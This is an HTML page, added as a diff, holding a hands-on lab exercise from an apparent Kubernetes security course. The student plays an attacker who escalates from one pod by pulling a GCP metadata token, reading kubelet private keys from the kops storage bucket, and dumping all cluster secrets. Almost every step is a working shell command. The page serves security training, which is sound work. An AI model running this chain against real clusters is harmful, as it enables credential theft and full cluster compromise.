@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Exercise: Kubernetes Cloud Attacks | Abusing and Protecting Kubernetes, Linux and Containers</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Exercise: Kubernetes Cloud Attacks" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:10000/exercises/kubernetes-cloud-attacks/" />
+<meta property="og:url" content="http://0.0.0.0:10000/exercises/kubernetes-cloud-attacks/" />
+<meta property="og:site_name" content="Abusing and Protecting Kubernetes, Linux and Containers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Exercise: Kubernetes Cloud Attacks" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Exercise: Kubernetes Cloud Attacks","url":"http://0.0.0.0:10000/exercises/kubernetes-cloud-attacks/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:10000/feed.xml" title="Abusing and Protecting Kubernetes, Linux and Containers" /></head>
+<body><header class="site-header">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/">Abusing and Protecting Kubernetes, Linux and Containers</a>
+
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+        <div class="trigger">
+            <a class="page-link" href="/">Exercises</a>
+            <a class="page-link" href="/about/">About</a>
+            <a class="page-link" href="/help/">Help</a>
+        </div>
+      </nav>
+
+      <!-- This is the section that comes from the default minima theme -->
+      
+    </div>
+  </header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post">
+<link rel="stylesheet" href="/assets/css/style.css">
+ <header class="post-header">
+    <h1 class="post-title">Exercise: Kubernetes Cloud Attacks</h1>
+  </header>
+
+
+  <div class="post-content">
+    
+
+    <h2 id="steps">Steps</h2>
+<p>In this exercise, you are a bad actor who has phished a developer.  That developer has very limited access on a Kubernetes cluster; they are able to exec into a specific single pod, presumably to debug the program running in it. You are going to escalate privilege in this cluster, by using its access to cloud resources.</p>
+<ol>
+<li>
+<p>Start up a fresh lxterminal by clicking the &quot;sparrow&quot; logo in the bottom-left corner of the screen, clicking run, typing <code>lxterminal</code> and hitting enter.</p>
+</li>
+<li>
+<p>Let's use bash.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
+</code></pre></div></div>
+</li>
+<li>
+<p>The course proctors will provide you with a cloud cluster ID number (<code>N</code>). Store this number in your shell profile in a new variable <code>CLOUD_ID</code>, and then read this new variable into your environment now:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Replace the "N" in `CLOUD_ID=N` with the ID number provided by the proctors</span>
+<span class="nb">echo</span> <span class="s2">"export CLOUD_ID=N"</span> <span class="o">&gt;&gt;</span> ~/.bashrc
+<span class="nb">source</span> ~/.bashrc
+</code></pre></div></div>
+</li>
+<li>
+<p>Start by exec-ing into your pod.  We'll give you a JWT, a certificate authority cert and an API server IP address.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/root/K8S-Exercise/kubectl <span class="se">\</span>
+<span class="nt">--server</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat</span> /sync/.cloud_clusters/serverip-<span class="nv">$CLOUD_ID</span><span class="si">)</span> <span class="se">\</span>
+<span class="nt">--token</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat</span> /sync/.cloud_clusters/token-cluster-<span class="nv">$CLOUD_ID</span><span class="si">)</span> <span class="se">\</span>
+<span class="nt">--certificate-authority</span><span class="o">=</span>/sync/.cloud_clusters/ca.crt-<span class="nv">$CLOUD_ID</span> <span class="se">\</span>
+<span class="nb">exec</span> <span class="nt">-it</span> bwa <span class="nt">--</span> /bin/bash
+</code></pre></div></div>
+</li>
+<li>
+<p>Take a look around:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pods
+</code></pre></div></div>
+</li>
+<li>
+<p>We're going to be making a ton of requests against the metadata API. Let's make a variable with part of the URL, to shorten the lines we're copying and pasting.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">host</span><span class="o">=</span><span class="s2">"metadata.google.internal"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Since this Kubernetes cluster runs in Google Cloud (GCP), we'll need to get the project ID that this node is running within:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-H</span> <span class="s2">"Metadata-Flavor: Google"</span> <span class="se">\</span>
+  http://<span class="nv">$host</span>/computeMetadata/v1/project/numeric-project-id
+</code></pre></div></div>
+</li>
+<li>
+<p>This exercise has a number of times like just now, where the output of our command doesn't have a newline, so you're seeing the command output's last line merged with the prompt for your next command.  Let's add a line feed (<code>\n</code>) to our command prompt for now:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span><span class="se">\u</span><span class="s2">@</span><span class="se">\h</span><span class="s2">:</span><span class="se">\w\$</span><span class="s2"> "</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now try that previous <code>curl</code> command again and see the difference:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-H</span> <span class="s2">"Metadata-Flavor: Google"</span> <span class="se">\</span>
+  http://<span class="nv">$host</span>/computeMetadata/v1/project/numeric-project-id
+</code></pre></div></div>
+</li>
+<li>
+<p>You should also be seeing <code>curl</code>'s speed statistics.  This is distracting, so we'll add the <code>-s</code> flag to some of our <code>curl</code> commands to silence that. Let's see things with that effect:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Metadata-Flavor: Google"</span> <span class="se">\</span>
+  http://<span class="nv">$host</span>/computeMetadata/v1/project/numeric-project-id
+</code></pre></div></div>
+</li>
+<li>
+<p>That URL is still very long. Let's make it shorter by creating a variable for the first part of the URL, including <code>computeMetadata/v1</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">url</span><span class="o">=</span><span class="s2">"http://metadata.google.internal/computeMetadata/v1"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Also, let's store the <code>Metadata-Flavor</code> header in a variable called <code>$head</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">head</span><span class="o">=</span><span class="s2">"Metadata-Flavor: Google"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Test our variables by running the same command as before, but with the variables in play:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"</span><span class="k">${</span><span class="nv">head</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">url</span><span class="k">}</span><span class="s2">/project/numeric-project-id"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now let's store the the numeric-project-id by running that command again, but in a subshell. We assign the ouput to a variable called <code>project</code>.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">project</span><span class="o">=</span><span class="si">$(</span> curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"</span><span class="k">${</span><span class="nv">head</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">url</span><span class="k">}</span><span class="s2">/project/numeric-project-id"</span> <span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now let's ask GCP's metadata service for this node's accounts:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"</span><span class="k">${</span><span class="nv">head</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">url</span><span class="k">}</span><span class="s2">/instance/service-accounts/"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>The output contains two service accounts, though one is just an alias for the other. Ask for a listing of data in the <code>default</code> service account:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"</span><span class="k">${</span><span class="nv">head</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">url</span><span class="k">}</span><span class="s2">/instance/service-accounts/default/"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>We see there's a kind of directory structure.  Check out the <code>aliases</code> item, like so:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"</span><span class="k">${</span><span class="nv">head</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">url</span><span class="k">}</span><span class="s2">/instance/service-accounts/default/aliases"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now take a look at that <code>email</code> item:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"</span><span class="k">${</span><span class="nv">head</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">url</span><span class="k">}</span><span class="s2">/instance/service-accounts/default/email"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>The valuable thing here is a temporary authentication token - this is a <em>JSON web token (JWT)</em>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"</span><span class="k">${</span><span class="nv">head</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">url</span><span class="k">}</span><span class="s2">/instance/service-accounts/default/token"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>We're getting back <code>json</code>, so let's use <code>jq</code> to make that easier to understand:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"</span><span class="k">${</span><span class="nv">head</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">url</span><span class="k">}</span><span class="s2">/instance/service-accounts/default/token"</span>|jq <span class="nb">.</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Note that there's an <code>expires</code> field.  Let's see how it changes when we pull the same token again:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"</span><span class="k">${</span><span class="nv">head</span><span class="k">}</span><span class="s2">"</span> <span class="se">\</span>
+<span class="s2">"</span><span class="k">${</span><span class="nv">url</span><span class="k">}</span><span class="s2">/instance/service-accounts/default/token"</span> <span class="se">\</span>
+| jq <span class="nb">.</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's parse the <code>access_token</code> part out, by telling <code>jq</code> that we want <code>.access_token</code>.  The <code>.</code> serves as the root of the data structure being parsed:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"</span><span class="k">${</span><span class="nv">head</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">url</span><span class="k">}</span><span class="s2">/instance/service-accounts/default/token"</span> | <span class="se">\</span>
+  jq .access_token
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's assign that to a variable. In the right hand size (RHS) of this command, we're running the command we just used in the previous step:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nv">token</span><span class="o">=</span><span class="si">$(</span> curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"</span><span class="k">${</span><span class="nv">head</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">url</span><span class="k">}</span><span class="s2">/instance/service-accounts/default/token"</span> | <span class="se">\</span>
+  jq .access_token <span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>View the token:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nv">$token</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now let's use the token to view a list of all Google Cloud Storage (GCS) buckets in this project:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"Accept: json"</span><span class="se">\</span>
+  https://www.googleapis.com/storage/v1/b/?project<span class="o">=</span><span class="nv">$project</span>
+</code></pre></div></div>
+<p><strong>Note:</strong> the URL there is simpler than it looks - we are hitting the <code>/storage</code> API, using version <code>v1</code>.  And then we're asking for a list of buckets, with <code>/b/</code>.</p>
+</li>
+<li>
+<p>We got back a JSON data structure with each bucket in its own sub-structure. Let's parse that out. First, get just the <code>.items</code> part of the output:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"Accept: json"</span> <span class="se">\</span>
+  https://www.googleapis.com/storage/v1/b/?project<span class="o">=</span><span class="nv">$project</span> | jq .items
+</code></pre></div></div>
+</li>
+<li>
+<p>This items part is a list/array of dictionaries, with each dictionary corresponding to one bucket.  Let's use <code>jq</code> to iterate over each one, getting its <code>name</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"Accept: json"</span> <span class="se">\</span>
+  https://www.googleapis.com/storage/v1/b/?project<span class="o">=</span><span class="nv">$project</span> | <span class="se">\</span>
+  jq <span class="nt">-r</span> <span class="s1">'.items[] | .name'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>So there's one bucket in particular that stands out, as it has <code>kops</code> in it, the name of a popular Kubernetes installer.  Let's take a look at that bucket in particular by sending the <code>items</code> list through a <code>select</code> filter:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"Accept: json"</span> <span class="se">\</span>
+  https://www.googleapis.com/storage/v1/b/?project<span class="o">=</span><span class="nv">$project</span> | <span class="se">\</span>
+  jq <span class="s1">'.items[] | select(.name | contains("bustakube-kops"))'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, let's take the resulting structure, which shows only one bucket, and parse the <code>name</code> out of it:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"Accept: json"</span> <span class="se">\</span>
+  https://www.googleapis.com/storage/v1/b/?project<span class="o">=</span><span class="nv">$project</span> | <span class="se">\</span>
+  jq <span class="s1">'.items[] | select(.name | contains("bustakube-kops")) | .name'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>We want to use this output in a URL, but those quotes around it will get in our way. We'll need to add a <code>-r</code> (raw output) flag to <code>jq</code>, to get it to remove the quotes:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"Accept: json"</span> <span class="se">\</span>
+  https://www.googleapis.com/storage/v1/b/?project<span class="o">=</span><span class="nv">$project</span> | <span class="se">\</span>
+  jq <span class="nt">-r</span> <span class="s1">'.items[] | select(.name | contains("bustakube-kops")) | .name'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Set the variable <code>bucket</code> to this bucket name:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">bucket</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"Accept: json"</span> <span class="se">\</span>
+  https://www.googleapis.com/storage/v1/b/?project<span class="o">=</span><span class="nv">$project</span> | <span class="se">\</span>
+  jq <span class="nt">-r</span> <span class="s1">'.items[] | select(.name | contains("bustakube-kops")) | .name'</span> <span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now get a list of object in the bucket.  You're going to be taking that bucket listing part of the URL  <code>/b/</code>, adding a bucket name, and now saying that you want a list of objects in it, via <code>/o/</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"Accept: json"</span> <span class="se">\</span>
+  https://www.googleapis.com/storage/v1/b/<span class="nv">$bucket</span>/o/?project<span class="o">=</span><span class="nv">$project</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>The resulting data structure has enough items to make them scroll off the page.  Let's make that data structure easier to follow by just asking for the name of each object:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"Accept: json"</span> <span class="se">\</span>
+  https://www.googleapis.com/storage/v1/b/<span class="nv">$bucket</span>/o/?project<span class="o">=</span><span class="nv">$project</span> | <span class="se">\</span>
+  jq <span class="nt">-r</span> <span class="s1">'.items[] | .name'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>That's still quite a bit of output, but you should be able to see that there's a number of lines (objects) with <code>/pki/private/</code> in their name. One of those is a kubelet's key pair:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"Accept: json"</span> <span class="se">\</span>
+  https://www.googleapis.com/storage/v1/b/<span class="nv">$bucket</span>/o/?project<span class="o">=</span><span class="nv">$project</span> <span class="se">\</span>
+  | jq <span class="nt">-r</span> <span class="s1">'.items[] | .name'</span> | <span class="nb">grep </span>private/kubelet/keyset
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's get that that bucket's <code>selfLink</code> - note that we're using <code>jq</code>'s <code>select</code> instead of <code>grep</code> in this line:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"Accept: json"</span> <span class="se">\</span>
+https://www.googleapis.com/storage/v1/b/<span class="nv">$bucket</span>/o/?project<span class="o">=</span><span class="nv">$project</span> | <span class="se">\</span>
+jq <span class="nt">-r</span> <span class="s1">'.items[] | select( .name | contains ("private/kubelet/keyset") ) | .selfLink'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>The <code>selfLink</code> has a complete URL reference to the bucket.  Let's put it in a variable called <code>link</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nb">link</span><span class="o">=</span><span class="si">$(</span> curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"Accept: json"</span> <span class="se">\</span>
+https://www.googleapis.com/storage/v1/b/<span class="nv">$bucket</span>/o/?project<span class="o">=</span><span class="nv">$project</span> <span class="se">\</span>
+| jq <span class="nt">-r</span> <span class="s1">'.items[] | select( .name | contains ("private/kubelet/keyset") ) | .selfLink'</span> <span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>If we append <code>?alt=media</code> to the end, we get its contents.  Let's <code>curl</code> the link, with the headers we need for authorization:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"Accept: json"</span> <span class="se">\</span>
+  <span class="s2">"</span><span class="k">${</span><span class="nv">link</span><span class="k">}</span><span class="s2">?alt=media"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>The JSON we get back contains Base64-encoded versions of a Kubelet client private key and certificate. Let's store those in a file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer </span><span class="nv">$token</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s2">"Accept: json"</span> <span class="se">\</span>
+  <span class="s2">"</span><span class="k">${</span><span class="nv">link</span><span class="k">}</span><span class="s2">?alt=media"</span> <span class="o">&gt;</span>keyset-kubelet.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's Base64 decode the &quot;privateMaterial&quot; and store it in a file called <code>clientkey</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>keyset-kubelet.yaml | <span class="nb">grep </span>privateMaterial | <span class="se">\</span>
+  <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span>clientkey
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's Base64 decode the &quot;publicMaterial&quot; and store it in a file called <code>clientcert</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>keyset-kubelet.yaml | <span class="nb">grep </span>publicMaterial <span class="se">\</span>
+| <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span>clientcert
+</code></pre></div></div>
+</li>
+<li>
+<p>Take a look at those two files:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>clientcert clientkey
+</code></pre></div></div>
+</li>
+<li>
+<p>Exit the bwa pod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exit</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Create a kubectl command alias to make things easier:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"/root/K8S-Exercise/kubectl </span><span class="se">\</span><span class="s2">
+--server=</span><span class="si">$(</span><span class="nb">cat</span> /sync/.cloud_clusters/serverip-<span class="nv">$CLOUD_ID</span><span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--token=</span><span class="si">$(</span><span class="nb">cat</span> /sync/.cloud_clusters/token-cluster-<span class="nv">$CLOUD_ID</span><span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--certificate-authority=/sync/.cloud_clusters/ca.crt-</span><span class="nv">$CLOUD_ID</span><span class="s2">"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Copy the <code>/clientkey</code> file out of the bwa pod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nb">exec </span>bwa <span class="nt">--</span> bash <span class="nt">-c</span> <span class="s2">"cat /clientkey"</span> <span class="o">&gt;</span>clientkey
+</code></pre></div></div>
+</li>
+<li>
+<p>Copy the <code>/clientcert</code> file out of the bwa pod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nb">exec </span>bwa <span class="nt">--</span> bash <span class="nt">-c</span> <span class="s2">"cat /clientcert"</span> <span class="o">&gt;</span>clientcert
+</code></pre></div></div>
+</li>
+<li>
+<p>Redo your kubectl alias to use the cloud cluster, but with  <code>--client-key</code> and <code>--client-certificate</code> command-line options in place of <code>--token</code>, so we can use the kubelet key and certificate to authenticate:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"/root/K8S-Exercise/kubectl </span><span class="se">\</span><span class="s2">
+--server=</span><span class="si">$(</span><span class="nb">cat</span> /sync/.cloud_clusters/serverip-<span class="nv">$CLOUD_ID</span><span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--certificate-authority=/sync/.cloud_clusters/ca.crt-</span><span class="nv">$CLOUD_ID</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--client-key=clientkey --client-certificate=clientcert "</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's see what privileges we have:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl auth can-i <span class="nt">--list</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Try pulling every secret in the cluster:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get secrets <span class="nt">--all-namespaces</span> <span class="nt">-o</span> yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that you have all the service account tokens!</p>
+</li>
+</ol>
+
+  </div>
+
+  <div class="post-exercise">
+    <h2 id="exercise-done">Done With the Exercise</h2>
+
+<p>Please flip your sticker over so we know how many people are done with the exercise.</p>
+</p>
+    
+
+
+    <h2 id="suspend-vms">Virtual Machine Management Tips</h2>
+
+<p> If you want to see what virtual machines are currently running, you can run:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  virsh list  
+</code></pre></div>    </div>
+    
+<p>If you have virtual machines using RAM and CPU, you can suspend all of them with:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sudo /sync/bin/suspend-all-vms.sh 
+</code></pre></div>    </div>
+
+    
+
+  </div>
+
+</article>
+<script src="/assets/scripts/clipboard.min.js"></script>
+<script src="/assets/scripts/copy.js"></script>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Abusing and Protecting Kubernetes, Linux and Containers</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Abusing and Protecting Kubernetes, Linux and Containers</li><li><a class="u-email" href="mailto:contact@inguardians.com">contact@inguardians.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">inguardians</span></a></li><li><a href="https://www.twitter.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">inguardians</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
